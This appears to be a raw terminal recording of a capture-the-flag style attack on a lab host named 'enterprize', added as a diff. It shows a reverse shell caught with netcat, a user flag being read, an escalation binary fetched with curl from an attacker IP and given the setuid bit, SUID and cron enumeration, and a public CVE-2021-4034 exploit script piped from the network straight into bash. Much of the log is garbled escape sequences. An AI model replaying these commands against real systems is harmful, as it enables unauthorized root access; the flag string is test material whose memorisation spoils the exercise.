@@ -1,0 +1,171 @@
+Script started on 2026-09-27 05:57:18+03:00 [COMMAND="rlwrap nc -nlvp 6047" TERM="xterm-256color" TTY="/dev/pts/5" COLUMNS="119" LINES="29"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.24.65.71] from (UNKNOWN) [172.24.64.1] 58132
+bash: cannot set terminal process group (4669): Inappropriate ioctl for device
+[Kbash: no job control in this shell
+john$ [Kjohn$ [K[?2004hjohn$ ls[?2004l[C[C[C[C[C[C[K[?2004hls
+[Kls
+
+> john@enterprize:~$ bash: syntax error near unexpected token `>
+32m└─4m
+:
+Command
+bash:
+command
+develop
+john@enterprize:~$
+syntax:
+user.txt
+john$ [Kjohn$ [K[?2004hjohn$ cat user.txt[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcat user.txt
+[Kcat user.txt
+THM{a99acf52687be464db48eca3b3359572}
+john$ [Kjohn$ [Kr/nfs /mnt[?2004hjohn$ [7mmount -t nfs localhost:/var/nfs /mnt[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hmount -t nfs localhost:/var/nfs /mnt
+[Kmount -t nfs localhost:/var/nfs /mnt
+mount: only root can use "--types" option
+john$ [Kjohn$ [K[?2004hjohn$ [7mmount -t nfs localhost:/var/nfs /mnt[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hmount -t nfs localhost:/var/nfs /mnt
+[Kmount -t nfs localhost:/var/nfs /mnt[Kmount -t nfs localhost:/var/nfs /mnt[Kmount -t nfs localhost:/var/nfs /mnt
+mount: only root can use "--types" option
+john$ [Kjohn$ [K[?2004hjohn$ [7mcurl -o /tmp/eop http://192.168.131.92:8008/eop[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcurl -o /tmp/eop http://192.168.131.92:8008/eop
+[Kcurl -o /tmp/eop http://192.168.131.92:8008/eop[Kcurl -o /tmp/eop http://192.168.131.92:8008/eop[Kcurl -o /tmp/eop http://192.168.131.92:8008/eop
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  9  762k    9 71324    0     0  54612      0  0:00:14  0:00:01  0:00:13 54570[K  9  762k    9 71324    0     0  54612      0  0:00:14  0:00:01  0:00:13 54570[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  9  762k    9 71324    0     0  54612      0  0:00:14  0:00:01  0:00:13 54570[K[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  9  762k    9 71324    0     0  54612      0  0:00:14  0:00:01  0:00:13 54570 35  762k   35  268k    0     0   122k      0  0:00:06  0:00:02  0:00:04  122k[K 35  762k   35  268k    0     0   122k      0  0:00:06  0:00:02  0:00:04  122k[K  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  9  762k    9 71324    0     0  54612      0  0:00:14  0:00:01  0:00:13 54570 35  762k   35  268k    0     0   122k      0  0:00:06  0:00:02  0:00:04  122k 84  762k   84  641k    0     0   198k      0  0:00:03  0:00:03 --:--:--  198k100  762k  100  762k    0     0   214k      0  0:00:03  0:00:03 --:--:--  214k
+john$ [Kjohn$ [K[?2004hjohn$ [7mchmod u+s /tmp/eop[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hchmod u+s /tmp/eop
+[Kchmod u+s /tmp/eop[Kchmod u+s /tmp/eop[Kchmod u+s /tmp/eop
+john$ [Kjohn$ [K[?2004hjohn$ [7mls -la /tmp/eop[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hls -la /tmp/eop
+[Kls -la /tmp/eop[Kls -la /tmp/eop[Kls -la /tmp/eop
+-rwSrw-r-- 1 john john 780624 Sep 27 03:03 /tmp/eop
+john$ [Kjohn$ [K[?2004hjohn$ [7m/tmp/eop[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004h/tmp/eop
+[K/tmp/eop[K/tmp/eop[K/tmp/eop
+bash: /tmp/eop: Permission denied
+john$ [Kjohn$ [K[?2004hjohn$ [7mchmod +x /tmp/eop[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hchmod +x /tmp/eop
+[Kchmod +x /tmp/eop[Kchmod +x /tmp/eop[Kchmod +x /tmp/eop
+john$ [Kjohn$ [K[?2004hjohn$ [7mls -la /tmp/eop[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hls -la /tmp/eop
+[Kls -la /tmp/eop[Kls -la /tmp/eop[Kls -la /tmp/eop
+-rwsrwxr-x 1 john john 780624 Sep 27 03:03 /tmp/eop
+john$ [Kjohn$ [K[?2004hjohn$ [7m/tmp/eop[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004h/tmp/eop
+[K/tmp/eop[K/tmp/eop[K/tmp/eop
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),30(dip),46(plugdev),1001(blocked)
+[K[K[?2004h[7mcp /tmp/eop /var/nfs/eop[27m[?2004l[K[?2004hcp /tmp/eop /var/nfs/eop
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[Kjohn$ [Kjohn$ [K[?2004hjohn$ [7mcp /tmp/eop /var/nfs/eop[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcp /tmp/eop /var/nfs/eop
+[Kcp /tmp/eop /var/nfs/eop[Kcp /tmp/eop /var/nfs/eop[Kcp /tmp/eop /var/nfs/eop
+john$ [Kjohn$ [K[?2004hjohn$ [7mchmod +x /var/nfs/eop[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hchmod +x /var/nfs/eop
+[Kchmod +x /var/nfs/eop[Kchmod +x /var/nfs/eop[Kchmod +x /var/nfs/eop
+john$ [Kjohn$ [K[?2004hjohn$ [7m/var/nfs/eop[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004h/var/nfs/eop
+[K/var/nfs/eop[K/var/nfs/eop[K/var/nfs/eop
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),30(dip),46(plugdev),1001(blocked)
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[Kjohn$ [Kjohn$ [K[?2004hjohn$ [7mcp /tmp/eop /home/john/develop/eop[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcp /tmp/eop /home/john/develop/eop
+[Kcp /tmp/eop /home/john/develop/eop
+john$ [Kjohn$ [K[?2004hjohn$ [7mchmod +x /home/john/develop/eop[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hchmod +x /home/john/develop/eop
+[Kchmod +x /home/john/develop/eop[Kchmod +x /home/john/develop/eop[Kchmod +x /home/john/develop/eop
+john$ [Kjohn$ [K[?2004hjohn$ [7m/home/john/develop/eop[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004h/home/john/develop/eop
+[K/home/john/develop/eop[K/home/john/develop/eop[K/home/john/develop/eop
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),30(dip),46(plugdev),1001(blocked)
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[Kjohn$ [Kjohn$ [K[?2004hjohn$ [7msudo -l[27m[?2004l[C[C[C[C[C[C[K[?2004hsudo -l
+[Ksudo -l[Ksudo -l[Ksudo -l
+bash: /usr/bin/sudo: Permission denied
+john$ [Kjohn$ [K[?2004hjohn$ [7mfind / -perm -4000 -type f 2>/dev/null[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hfind / -perm -4000 -type f 2>/dev/null
+[Kfind / -perm -4000 -type f 2>/dev/null[Kfind / -perm -4000 -type f 2>/dev/null[Kfind / -perm -4000 -type f 2>/dev/null
+/sbin/mount.nfs
+[K/tmp/eop
+[K/usr/lib/eject/dmcrypt-get-device
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/newuidmap
+/usr/bin/passwd
+/usr/bin/traceroute6.iputils
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/newgidmap
+/bin/mount
+/bin/su
+/bin/umount
+/bin/fusermount
+/bin/ping
+[Kjohn$ [Kjohn$ [K[?2004hjohn$ [7mls -la /etc/cron.d/[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hls -la /etc/cron.d/
+[Kls -la /etc/cron.d/[Kls -la /etc/cron.d/[Kls -la /etc/cron.d/
+total 24
+drwxr-xr-x  2 root root 4096 Jan  3  2021 .
+drwxr-xr-x 98 root root 4096 Sep 27 03:06 ..
+-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
+-rw-r--r--  1 root root  589 Jan 14  2020 mdadm
+-rw-r--r--  1 root root  712 Jan 17  2018 php
+-rw-r--r--  1 root root  191 Aug  6  2020 popularity-contest
+john$ [Kjohn$ [K[?2004hjohn$ [7mcat /etc/cron.d/*[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcat /etc/cron.d/*
+[Kcat /etc/cron.d/*[Kcat /etc/cron.d/*[Kcat /etc/cron.d/*
+#
+# cron.d/mdadm -- schedules periodic redundancy checks of MD devices
+#
+# Copyright © martin f. krafft <madduck@madduck.net>
+# distributed under the terms of the Artistic Licence 2.0
+#
+
+# By default, run at 00:57 on every Sunday, but do nothing unless the day of
+# the month is less than or equal to 7. Thus, only run on the first Sunday of
+# each month. crontab(5) sucks, unfortunately, in this regard; therefore this
+# hack (see #380425).
+57 0 * * 0 root if [ -x /usr/share/mdadm/checkarray ] && [ $(date +\%d) -le 7 ]; then /usr/share/mdadm/checkarray --cron --all --idle --quiet; fi
+# /etc/cron.d/php@PHP_VERSION@: crontab fragment for PHP
+#  This purges session files in session.save_path older than X,
+#  where X is defined in seconds as the largest value of
+#  session.gc_maxlifetime from all your SAPI php.ini files
+#  or 24 minutes if not defined.  The script triggers only
+#  when session.save_handler=files.
+#
+#  WARNING: The scripts tries hard to honour all relevant
+#  session PHP options, but if you do something unusual
+#  you have to disable this script and take care of your
+#  sessions yourself.
+
+# Look for and purge old sessions every 30 minutes
+09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+34 13 * * *   root    test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-contest --crond
+john$ [Kjohn$ [K[?2004hjohn$ [7mls -la /etc/systemd/system/[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hls -la /etc/systemd/system/
+[Kls -la /etc/systemd/system/[Kls -la /etc/systemd/system/[Kls -la /etc/systemd/system/
+total 64
+drwxr-xr-x 16 root root 4096 Jan  3  2021 .
+drwxr-xr-x  5 root root 4096 Jan  3  2021 ..
+drwxr-xr-x  2 root root 4096 Aug  6  2020 cloud-final.service.wants
+drwxr-xr-x  2 root root 4096 Aug  6  2020 cloud-init.target.wants
+lrwxrwxrwx  1 root root   44 Aug  6  2020 dbus-org.freedesktop.resolve1.service -> /lib/systemd/system/systemd-resolved.service
+lrwxrwxrwx  1 root root   36 Jan  3  2021 dbus-org.freedesktop.thermald.service -> /lib/systemd/system/thermald.service
+drwxr-xr-x  2 root root 4096 Aug  6  2020 default.target.wants
+drwxr-xr-x  2 root root 4096 Aug  6  2020 final.target.wants
+drwxr-xr-x  2 root root 4096 Aug  6  2020 getty.target.wants
+drwxr-xr-x  2 root root 4096 Aug  6  2020 graphical.target.wants
+lrwxrwxrwx  1 root root   38 Aug  6  2020 iscsi.service -> /lib/systemd/system/open-iscsi.service
+drwxr-xr-x  2 root root 4096 Jan  3  2021 multi-user.target.wants
+drwxr-xr-x  2 root root 4096 Aug  6  2020 network-online.target.wants
+drwxr-xr-x  2 root root 4096 Aug  6  2020 open-vm-tools.service.requires
+drwxr-xr-x  2 root root 4096 Aug  6  2020 paths.target.wants
+drwxr-xr-x  2 root root 4096 Jan  3  2021 remote-fs.target.wants
+drwxr-xr-x  2 root root 4096 Jan  3  2021 sockets.target.wants
+lrwxrwxrwx  1 root root   31 Jan  3  2021 sshd.service -> /lib/systemd/system/ssh.service
+drwxr-xr-x  2 root root 4096 Aug  6  2020 sysinit.target.wants
+lrwxrwxrwx  1 root root   35 Aug  6  2020 syslog.service -> /lib/systemd/system/rsyslog.service
+drwxr-xr-x  2 root root 4096 Jan  3  2021 timers.target.wants
+lrwxrwxrwx  1 root root   41 Aug  6  2020 vmtoolsd.service -> /lib/systemd/system/open-vm-tools.service
+john$ [Kjohn$ [K[?2004hjohn$ [7mcd /tmp[27m[?2004l[C[C[C[C[C[C[K[?2004hcd /tmp
+[Kcd /tmp[Kcd /tmp[Kcd /tmp
+john$ [Kjohn$ [K[?2004hjohn$ [7mcurl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh | bash[27m[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[K[?2004hcurl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh | bash
+[Kcurl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-20221-4034.sh | bash[K21-4034.sh | bash[Kcurl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-20221-4034.sh | bash
+[K[K[?2004h[?2004l[?2004h
+[K
+[?2004l
+Script done on 2026-09-27 06:11:32+03:00 [COMMAND_EXIT_CODE="1"]
